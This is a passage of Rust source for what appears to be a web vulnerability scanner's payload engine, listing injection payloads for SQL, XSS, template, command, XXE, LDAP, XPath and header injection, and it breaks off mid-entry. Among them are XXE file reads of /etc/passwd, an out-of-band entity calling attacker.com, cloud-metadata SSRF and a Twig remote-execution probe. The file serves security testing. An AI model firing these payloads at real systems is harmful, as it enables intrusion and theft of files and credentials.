//! Payload Engine
//!
//! Responsible for payload generation, context-aware payload selection,
//! parameter mutation, encoding strategies, and safe payload limits.

use crate::injection::{InjectionCategory, ParameterLocation, SafetyConfig};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// Payload engine trait
pub trait PayloadEngine: Send + Sync {
    /// Get payloads for a specific category and context
    fn get_payloads(&self, category: InjectionCategory, context: &PayloadContext) -> Vec<Payload>;
    
    /// Get all available payloads for a category
    fn get_all_payloads(&self, category: InjectionCategory) -> Vec<Payload>;
    
    /// Mutate a parameter value with payloads
    fn mutate_parameter(&self, original: &str, payloads: &[Payload], location: ParameterLocation) -> Vec<String>;
    
    /// Apply encoding to payload
    fn encode_payload(&self, payload: &str, encoding: Encoding) -> String;
    
    /// Get supported encodings
    fn supported_encodings(&self) -> Vec<Encoding>;
}

/// Payload context for context-aware selection
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PayloadContext {
    /// Parameter name
    pub parameter_name: String,
    /// Parameter location
    pub location: ParameterLocation,
    /// Expected data type (string, integer, boolean, etc.)
    pub expected_type: Option<String>,
    /// Framework/technology hints
    pub technology_hints: Vec<String>,
    /// Database type hints (mysql, postgres, oracle, etc.)
    pub database_type: Option<String>,
    /// Template engine hints (jinja2, twig, freemarker, etc.)
    pub template_engine: Option<String>,
    /// OS hints (linux, windows, etc.)
    pub os_type: Option<String>,
    /// Whether parameter appears to be an ID
    pub is_id_parameter: bool,
    /// Whether parameter appears in authentication context
    pub is_auth_context: bool,
    /// Custom context data
    pub custom: HashMap<String, serde_json::Value>,
}

/// Payload definition
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Payload {
    /// Unique payload ID
    pub id: String,
    /// Payload category
    pub category: InjectionCategory,
    /// Raw payload string
    pub raw: String,
    /// Description
    pub description: String,
    /// Tags for filtering
    pub tags: Vec<String>,
    /// Risk level (1-10)
    pub risk_level: u8,
    /// Whether this is a safe/non-destructive payload
    pub is_safe: bool,
    /// Required context hints
    pub required_context: Vec<String>,
    /// Encodings this payload works with
    pub compatible_encodings: Vec<Encoding>,
    /// Detection method this payload targets
    pub detection_method: crate::injection::DetectionMethod,
}

/// Encoding strategies
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Encoding {
    /// No encoding
    None,
    /// URL encoding
    Url,
    /// Double URL encoding
    DoubleUrl,
    /// HTML entity encoding
    HtmlEntity,
    /// Unicode encoding
    Unicode,
    /// Base64 encoding
    Base64,
    /// Hex encoding
    Hex,
    /// SQL comment termination
    SqlComment,
    /// XML encoding
    Xml,
    /// JSON encoding
    Json,
    /// Custom encoding
    Custom,
}

/// Built-in payload engine implementation
pub struct BuiltinPayloadEngine {
    payloads: HashMap<InjectionCategory, Vec<Payload>>,
    safety: SafetyConfig,
}

impl BuiltinPayloadEngine {
    /// Create a new builtin payload engine
    pub fn new(safety: SafetyConfig) -> Self {
        let mut engine = Self {
            payloads: HashMap::new(),
            safety,
        };
        engine.load_builtin_payloads();
        engine
    }
    
    /// Load built-in payloads for all categories
    fn load_builtin_payloads(&mut self) {
        // SQL Injection payloads
        self.payloads.insert(InjectionCategory::SqlInjection, Self::sql_injection_payloads());
        
        // NoSQL Injection payloads
        self.payloads.insert(InjectionCategory::NoSqlInjection, Self::nosql_injection_payloads());
        
        // XSS payloads
        self.payloads.insert(InjectionCategory::Xss, Self::xss_payloads());
        
        // SSTI payloads
        self.payloads.insert(InjectionCategory::Ssti, Self::ssti_payloads());
        
        // Command Injection payloads
        self.payloads.insert(InjectionCategory::CommandInjection, Self::command_injection_payloads());
        
        // XXE payloads
        self.payloads.insert(InjectionCategory::Xxe, Self::xxe_payloads());
        
        // LDAP Injection payloads
        self.payloads.insert(InjectionCategory::LdapInjection, Self::ldap_injection_payloads());
        
        // XPath Injection payloads
        self.payloads.insert(InjectionCategory::XPathInjection, Self::xpath_injection_payloads());
        
        // Header Injection payloads
        self.payloads.insert(InjectionCategory::HeaderInjection, Self::header_injection_payloads());
    }
    
    /// SQL Injection payloads
    fn sql_injection_payloads() -> Vec<Payload> {
        vec![
            // Error-based
            Payload {
                id: "sql_error_1".to_string(),
                category: InjectionCategory::SqlInjection,
                raw: "'".to_string(),
                description: "Single quote to break SQL query".to_string(),
                tags: vec!["error-based".to_string(), "basic".to_string()],
                risk_level: 2,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url, Encoding::DoubleUrl],
                detection_method: crate::injection::DetectionMethod::ErrorBased,
            },
            Payload {
                id: "sql_error_2".to_string(),
                category: InjectionCategory::SqlInjection,
                raw: "\"".to_string(),
                description: "Double quote to break SQL query".to_string(),
                tags: vec!["error-based".to_string(), "basic".to_string()],
                risk_level: 2,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url, Encoding::DoubleUrl],
                detection_method: crate::injection::DetectionMethod::ErrorBased,
            },
            Payload {
                id: "sql_error_3".to_string(),
                category: InjectionCategory::SqlInjection,
                raw: "' OR '1'='1".to_string(),
                description: "Classic tautology for error-based detection".to_string(),
                tags: vec!["error-based".to_string(), "tautology".to_string()],
                risk_level: 3,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url, Encoding::DoubleUrl],
                detection_method: crate::injection::DetectionMethod::ErrorBased,
            },
            Payload {
                id: "sql_error_4".to_string(),
                category: InjectionCategory::SqlInjection,
                raw: "';--".to_string(),
                description: "SQL comment termination".to_string(),
                tags: vec!["error-based".to_string(), "comment".to_string()],
                risk_level: 3,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url, Encoding::SqlComment],
                detection_method: crate::injection::DetectionMethod::ErrorBased,
            },
            // Boolean-based
            Payload {
                id: "sql_bool_1".to_string(),
                category: InjectionCategory::SqlInjection,
                raw: "' OR '1'='1' --".to_string(),
                description: "Boolean-based tautology with comment".to_string(),
                tags: vec!["boolean-based".to_string(), "tautology".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::BooleanBased,
            },
            Payload {
                id: "sql_bool_2".to_string(),
                category: InjectionCategory::SqlInjection,
                raw: "' AND '1'='2".to_string(),
                description: "Boolean-based false condition".to_string(),
                tags: vec!["boolean-based".to_string(), "false-condition".to_string()],
                risk_level: 3,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::BooleanBased,
            },
            // Time-based
            Payload {
                id: "sql_time_1".to_string(),
                category: InjectionCategory::SqlInjection,
                raw: "'; WAITFOR DELAY '0:0:5'--".to_string(),
                description: "SQL Server time-based delay".to_string(),
                tags: vec!["time-based".to_string(), "sqlserver".to_string()],
                risk_level: 5,
                is_safe: true,
                required_context: vec!["sqlserver".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::TimeBased,
            },
            Payload {
                id: "sql_time_2".to_string(),
                category: InjectionCategory::SqlInjection,
                raw: "'; SELECT SLEEP(5)--".to_string(),
                description: "MySQL time-based delay".to_string(),
                tags: vec!["time-based".to_string(), "mysql".to_string()],
                risk_level: 5,
                is_safe: true,
                required_context: vec!["mysql".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::TimeBased,
            },
            Payload {
                id: "sql_time_3".to_string(),
                category: InjectionCategory::SqlInjection,
                raw: "'; SELECT pg_sleep(5)--".to_string(),
                description: "PostgreSQL time-based delay".to_string(),
                tags: vec!["time-based".to_string(), "postgresql".to_string()],
                risk_level: 5,
                is_safe: true,
                required_context: vec!["postgresql".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::TimeBased,
            },
            // Union-based
            Payload {
                id: "sql_union_1".to_string(),
                category: InjectionCategory::SqlInjection,
                raw: "' UNION SELECT NULL,NULL,NULL--".to_string(),
                description: "Union-based injection with 3 columns".to_string(),
                tags: vec!["union-based".to_string()],
                risk_level: 6,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::ErrorBased,
            },
        ]
    }
    
    /// NoSQL Injection payloads
    fn nosql_injection_payloads() -> Vec<Payload> {
        vec![
            Payload {
                id: "nosql_1".to_string(),
                category: InjectionCategory::NoSqlInjection,
                raw: "{\"$ne\": null}".to_string(),
                description: "MongoDB $ne operator for authentication bypass".to_string(),
                tags: vec!["mongodb".to_string(), "auth-bypass".to_string()],
                risk_level: 5,
                is_safe: true,
                required_context: vec!["mongodb".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Json],
                detection_method: crate::injection::DetectionMethod::ErrorBased,
            },
            Payload {
                id: "nosql_2".to_string(),
                category: InjectionCategory::NoSqlInjection,
                raw: "{\"$gt\": \"\"}".to_string(),
                description: "MongoDB $gt operator".to_string(),
                tags: vec!["mongodb".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec!["mongodb".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Json],
                detection_method: crate::injection::DetectionMethod::ErrorBased,
            },
            Payload {
                id: "nosql_3".to_string(),
                category: InjectionCategory::NoSqlInjection,
                raw: "{\"$where\": \"1==1\"}".to_string(),
                description: "MongoDB $where clause injection".to_string(),
                tags: vec!["mongodb".to_string(), "where".to_string()],
                risk_level: 6,
                is_safe: true,
                required_context: vec!["mongodb".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Json],
                detection_method: crate::injection::DetectionMethod::ErrorBased,
            },
            Payload {
                id: "nosql_4".to_string(),
                category: InjectionCategory::NoSqlInjection,
                raw: "{\"$regex\": \".*\"}".to_string(),
                description: "MongoDB regex injection".to_string(),
                tags: vec!["mongodb".to_string(), "regex".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec!["mongodb".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Json],
                detection_method: crate::injection::DetectionMethod::ErrorBased,
            },
        ]
    }
    
    /// XSS payloads
    fn xss_payloads() -> Vec<Payload> {
        vec![
            // Reflected XSS - basic
            Payload {
                id: "xss_reflected_1".to_string(),
                category: InjectionCategory::Xss,
                raw: "<script>alert(1)</script>".to_string(),
                description: "Basic script tag injection".to_string(),
                tags: vec!["reflected".to_string(), "basic".to_string()],
                risk_level: 3,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url, Encoding::HtmlEntity],
                detection_method: crate::injection::DetectionMethod::Reflection,
            },
            Payload {
                id: "xss_reflected_2".to_string(),
                category: InjectionCategory::Xss,
                raw: "<img src=x onerror=alert(1)>".to_string(),
                description: "Image tag with onerror handler".to_string(),
                tags: vec!["reflected".to_string(), "img".to_string()],
                risk_level: 3,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url, Encoding::HtmlEntity],
                detection_method: crate::injection::DetectionMethod::Reflection,
            },
            Payload {
                id: "xss_reflected_3".to_string(),
                category: InjectionCategory::Xss,
                raw: "<svg onload=alert(1)>".to_string(),
                description: "SVG onload handler".to_string(),
                tags: vec!["reflected".to_string(), "svg".to_string()],
                risk_level: 3,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url, Encoding::HtmlEntity],
                detection_method: crate::injection::DetectionMethod::Reflection,
            },
            // Attribute-based
            Payload {
                id: "xss_attr_1".to_string(),
                category: InjectionCategory::Xss,
                raw: "\" onmouseover=\"alert(1)".to_string(),
                description: "Attribute breakout with event handler".to_string(),
                tags: vec!["attribute".to_string(), "event-handler".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url, Encoding::HtmlEntity],
                detection_method: crate::injection::DetectionMethod::Reflection,
            },
            Payload {
                id: "xss_attr_2".to_string(),
                category: InjectionCategory::Xss,
                raw: "javascript:alert(1)".to_string(),
                description: "JavaScript protocol handler".to_string(),
                tags: vec!["attribute".to_string(), "javascript-protocol".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::Reflection,
            },
            // Filter bypass
            Payload {
                id: "xss_bypass_1".to_string(),
                category: InjectionCategory::Xss,
                raw: "<ScRiPt>alert(1)</ScRiPt>".to_string(),
                description: "Case variation bypass".to_string(),
                tags: vec!["bypass".to_string(), "case-variation".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::Reflection,
            },
            Payload {
                id: "xss_bypass_2".to_string(),
                category: InjectionCategory::Xss,
                raw: "<script>alert(String.fromCharCode(88,83,83))</script>".to_string(),
                description: "String.fromCharCode encoding bypass".to_string(),
                tags: vec!["bypass".to_string(), "encoding".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::Reflection,
            },
            // DOM XSS indicators
            Payload {
                id: "xss_dom_1".to_string(),
                category: InjectionCategory::Xss,
                raw: "#<script>alert(1)</script>".to_string(),
                description: "Fragment-based DOM XSS".to_string(),
                tags: vec!["dom".to_string(), "fragment".to_string()],
                risk_level: 3,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None],
                detection_method: crate::injection::DetectionMethod::Reflection,
            },
        ]
    }
    
    /// SSTI payloads
    fn ssti_payloads() -> Vec<Payload> {
        vec![
            // Jinja2
            Payload {
                id: "ssti_jinja2_1".to_string(),
                category: InjectionCategory::Ssti,
                raw: "{{7*7}}".to_string(),
                description: "Jinja2 basic expression evaluation".to_string(),
                tags: vec!["jinja2".to_string(), "math".to_string()],
                risk_level: 3,
                is_safe: true,
                required_context: vec!["jinja2".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
            Payload {
                id: "ssti_jinja2_2".to_string(),
                category: InjectionCategory::Ssti,
                raw: "{{config}}".to_string(),
                description: "Jinja2 config object exposure".to_string(),
                tags: vec!["jinja2".to_string(), "config".to_string()],
                risk_level: 5,
                is_safe: true,
                required_context: vec!["jinja2".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
            Payload {
                id: "ssti_jinja2_3".to_string(),
                category: InjectionCategory::Ssti,
                raw: "{{''.__class__.__mro__[1].__subclasses__()}}".to_string(),
                description: "Jinja2 subclass enumeration".to_string(),
                tags: vec!["jinja2".to_string(), "rce".to_string()],
                risk_level: 7,
                is_safe: false,
                required_context: vec!["jinja2".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
            // Twig
            Payload {
                id: "ssti_twig_1".to_string(),
                category: InjectionCategory::Ssti,
                raw: "{{7*7}}".to_string(),
                description: "Twig basic expression evaluation".to_string(),
                tags: vec!["twig".to_string(), "math".to_string()],
                risk_level: 3,
                is_safe: true,
                required_context: vec!["twig".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
            Payload {
                id: "ssti_twig_2".to_string(),
                category: InjectionCategory::Ssti,
                raw: "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}".to_string(),
                description: "Twig RCE via filter callback".to_string(),
                tags: vec!["twig".to_string(), "rce".to_string()],
                risk_level: 8,
                is_safe: false,
                required_context: vec!["twig".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
            // Freemarker
            Payload {
                id: "ssti_freemarker_1".to_string(),
                category: InjectionCategory::Ssti,
                raw: "${7*7}".to_string(),
                description: "Freemarker basic expression".to_string(),
                tags: vec!["freemarker".to_string(), "math".to_string()],
                risk_level: 3,
                is_safe: true,
                required_context: vec!["freemarker".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
            // Velocity
            Payload {
                id: "ssti_velocity_1".to_string(),
                category: InjectionCategory::Ssti,
                raw: "#set($x=7*7)${x}".to_string(),
                description: "Velocity basic expression".to_string(),
                tags: vec!["velocity".to_string(), "math".to_string()],
                risk_level: 3,
                is_safe: true,
                required_context: vec!["velocity".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
            // Generic
            Payload {
                id: "ssti_generic_1".to_string(),
                category: InjectionCategory::Ssti,
                raw: "${7*7}".to_string(),
                description: "Generic template expression".to_string(),
                tags: vec!["generic".to_string(), "math".to_string()],
                risk_level: 3,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
        ]
    }
    
    /// Command Injection payloads
    fn command_injection_payloads() -> Vec<Payload> {
        vec![
            // Linux/Unix
            Payload {
                id: "cmd_linux_1".to_string(),
                category: InjectionCategory::CommandInjection,
                raw: "; id".to_string(),
                description: "Linux command separator with id".to_string(),
                tags: vec!["linux".to_string(), "separator".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec!["linux".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
            Payload {
                id: "cmd_linux_2".to_string(),
                category: InjectionCategory::CommandInjection,
                raw: "| id".to_string(),
                description: "Linux pipe command injection".to_string(),
                tags: vec!["linux".to_string(), "pipe".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec!["linux".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
            Payload {
                id: "cmd_linux_3".to_string(),
                category: InjectionCategory::CommandInjection,
                raw: "`id`".to_string(),
                description: "Linux backtick command substitution".to_string(),
                tags: vec!["linux".to_string(), "backtick".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec!["linux".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
            Payload {
                id: "cmd_linux_4".to_string(),
                category: InjectionCategory::CommandInjection,
                raw: "$(id)".to_string(),
                description: "Linux command substitution".to_string(),
                tags: vec!["linux".to_string(), "substitution".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec!["linux".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
            Payload {
                id: "cmd_linux_5".to_string(),
                category: InjectionCategory::CommandInjection,
                raw: "&& id".to_string(),
                description: "Linux AND command chaining".to_string(),
                tags: vec!["linux".to_string(), "and".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec!["linux".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
            Payload {
                id: "cmd_linux_6".to_string(),
                category: InjectionCategory::CommandInjection,
                raw: "|| id".to_string(),
                description: "Linux OR command chaining".to_string(),
                tags: vec!["linux".to_string(), "or".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec!["linux".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
            // Windows
            Payload {
                id: "cmd_windows_1".to_string(),
                category: InjectionCategory::CommandInjection,
                raw: "& whoami".to_string(),
                description: "Windows command separator".to_string(),
                tags: vec!["windows".to_string(), "separator".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec!["windows".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
            Payload {
                id: "cmd_windows_2".to_string(),
                category: InjectionCategory::CommandInjection,
                raw: "| whoami".to_string(),
                description: "Windows pipe command injection".to_string(),
                tags: vec!["windows".to_string(), "pipe".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec!["windows".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
            // Time-based
            Payload {
                id: "cmd_time_1".to_string(),
                category: InjectionCategory::CommandInjection,
                raw: "; sleep 5".to_string(),
                description: "Linux time-based command injection".to_string(),
                tags: vec!["linux".to_string(), "time-based".to_string()],
                risk_level: 5,
                is_safe: true,
                required_context: vec!["linux".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::TimeBased,
            },
            Payload {
                id: "cmd_time_2".to_string(),
                category: InjectionCategory::CommandInjection,
                raw: "& timeout 5".to_string(),
                description: "Windows time-based command injection".to_string(),
                tags: vec!["windows".to_string(), "time-based".to_string()],
                risk_level: 5,
                is_safe: true,
                required_context: vec!["windows".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::TimeBased,
            },
        ]
    }
    
    /// XXE payloads
    fn xxe_payloads() -> Vec<Payload> {
        vec![
            // Basic XXE
            Payload {
                id: "xxe_basic_1".to_string(),
                category: InjectionCategory::Xxe,
                raw: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>"#.to_string(),
                description: "Basic XXE for file read".to_string(),
                tags: vec!["file-read".to_string(), "basic".to_string()],
                risk_level: 6,
                is_safe: false,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Xml],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
            Payload {
                id: "xxe_basic_2".to_string(),
                category: InjectionCategory::Xxe,
                raw: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>"#.to_string(),
                description: "Windows file read XXE".to_string(),
                tags: vec!["file-read".to_string(), "windows".to_string()],
                risk_level: 6,
                is_safe: false,
                required_context: vec!["windows".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Xml],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
            // Parameter entity XXE
            Payload {
                id: "xxe_param_1".to_string(),
                category: InjectionCategory::Xxe,
                raw: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo/>"#.to_string(),
                description: "Parameter entity XXE".to_string(),
                tags: vec!["parameter-entity".to_string(), "file-read".to_string()],
                risk_level: 6,
                is_safe: false,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Xml],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
            // Blind XXE (out-of-band)
            Payload {
                id: "xxe_blind_1".to_string(),
                category: InjectionCategory::Xxe,
                raw: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]><foo/>"#.to_string(),
                description: "Blind XXE with external DTD".to_string(),
                tags: vec!["blind".to_string(), "oob".to_string()],
                risk_level: 7,
                is_safe: false,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Xml],
                detection_method: crate::injection::DetectionMethod::OutOfBand,
            },
            // XXE for SSRF
            Payload {
                id: "xxe_ssrf_1".to_string(),
                category: InjectionCategory::Xxe,
                raw: r#"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>"#.to_string(),
                description: "XXE for SSRF to metadata service".to_string(),
                tags: vec!["ssrf".to_string(), "metadata".to_string()],
                risk_level: 7,
                is_safe: false,
                required_context: vec!["aws".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Xml],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
        ]
    }
    
    /// LDAP Injection payloads
    fn ldap_injection_payloads() -> Vec<Payload> {
        vec![
            // Basic LDAP injection
            Payload {
                id: "ldap_basic_1".to_string(),
                category: InjectionCategory::LdapInjection,
                raw: "*)(|(userPassword=*)".to_string(),
                description: "LDAP filter injection to bypass authentication".to_string(),
                tags: vec!["auth-bypass".to_string(), "basic".to_string()],
                risk_level: 5,
                is_safe: true,
                required_context: vec!["ldap".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::ErrorBased,
            },
            Payload {
                id: "ldap_basic_2".to_string(),
                category: InjectionCategory::LdapInjection,
                raw: "*)(|(cn=*))".to_string(),
                description: "LDAP filter injection to enumerate users".to_string(),
                tags: vec!["enumeration".to_string(), "basic".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec!["ldap".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::ErrorBased,
            },
            Payload {
                id: "ldap_basic_3".to_string(),
                category: InjectionCategory::LdapInjection,
                raw: "admin*)(|(userPassword=*)".to_string(),
                description: "LDAP injection targeting admin user".to_string(),
                tags: vec!["auth-bypass".to_string(), "admin".to_string()],
                risk_level: 6,
                is_safe: true,
                required_context: vec!["ldap".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::ErrorBased,
            },
            // Blind LDAP injection
            Payload {
                id: "ldap_blind_1".to_string(),
                category: InjectionCategory::LdapInjection,
                raw: "*)(|(objectClass=*))".to_string(),
                description: "Blind LDAP injection - always true condition".to_string(),
                tags: vec!["blind".to_string(), "always-true".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec!["ldap".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::BooleanBased,
            },
            Payload {
                id: "ldap_blind_2".to_string(),
                category: InjectionCategory::LdapInjection,
                raw: "*)(!(objectClass=*))".to_string(),
                description: "Blind LDAP injection - always false condition".to_string(),
                tags: vec!["blind".to_string(), "always-false".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec!["ldap".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::BooleanBased,
            },
        ]
    }
    
    /// XPath Injection payloads
    fn xpath_injection_payloads() -> Vec<Payload> {
        vec![
            // Basic XPath injection
            Payload {
                id: "xpath_basic_1".to_string(),
                category: InjectionCategory::XPathInjection,
                raw: "' or '1'='1".to_string(),
                description: "XPath tautology for authentication bypass".to_string(),
                tags: vec!["auth-bypass".to_string(), "tautology".to_string()],
                risk_level: 5,
                is_safe: true,
                required_context: vec!["xpath".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::ErrorBased,
            },
            Payload {
                id: "xpath_basic_2".to_string(),
                category: InjectionCategory::XPathInjection,
                raw: "' or '1'='1' ]".to_string(),
                description: "XPath injection with bracket closure".to_string(),
                tags: vec!["auth-bypass".to_string(), "bracket".to_string()],
                risk_level: 5,
                is_safe: true,
                required_context: vec!["xpath".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::ErrorBased,
            },
            Payload {
                id: "xpath_basic_3".to_string(),
                category: InjectionCategory::XPathInjection,
                raw: "'] | //user/password | ['".to_string(),
                description: "XPath union injection for data extraction".to_string(),
                tags: vec!["data-extraction".to_string(), "union".to_string()],
                risk_level: 6,
                is_safe: true,
                required_context: vec!["xpath".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::ErrorBased,
            },
            // Blind XPath injection
            Payload {
                id: "xpath_blind_1".to_string(),
                category: InjectionCategory::XPathInjection,
                raw: "' and '1'='1".to_string(),
                description: "Blind XPath injection - true condition".to_string(),
                tags: vec!["blind".to_string(), "true-condition".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec!["xpath".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::BooleanBased,
            },
            Payload {
                id: "xpath_blind_2".to_string(),
                category: InjectionCategory::XPathInjection,
                raw: "' and '1'='2".to_string(),
                description: "Blind XPath injection - false condition".to_string(),
                tags: vec!["blind".to_string(), "false-condition".to_string()],
                risk_level: 4,
                is_safe: true,
                required_context: vec!["xpath".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::BooleanBased,
            },
            // XPath 2.0 functions
            Payload {
                id: "xpath_func_1".to_string(),
                category: InjectionCategory::XPathInjection,
                raw: "' or doc('file:///etc/passwd') or '".to_string(),
                description: "XPath 2.0 doc() function for file read".to_string(),
                tags: vec!["file-read".to_string(), "xpath2".to_string()],
                risk_level: 7,
                is_safe: false,
                required_context: vec!["xpath".to_string()],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::PatternMatch,
            },
        ]
    }
    
    /// Header Injection payloads
    fn header_injection_payloads() -> Vec<Payload> {
        vec![
            // CRLF injection
            Payload {
                id: "header_crlf_1".to_string(),
                category: InjectionCategory::HeaderInjection,
                raw: "\r\nX-Injected: test".to_string(),
                description: "CRLF injection to add custom header".to_string(),
                tags: vec!["crlf".to_string(), "header-injection".to_string()],
                risk_level: 5,
                is_safe: true,
                required_context: vec![],
                compatible_encodings: vec![Encoding::None, Encoding::Url],
                detection_method: crate::injection::DetectionMethod::Reflection,
            },
            Payload {
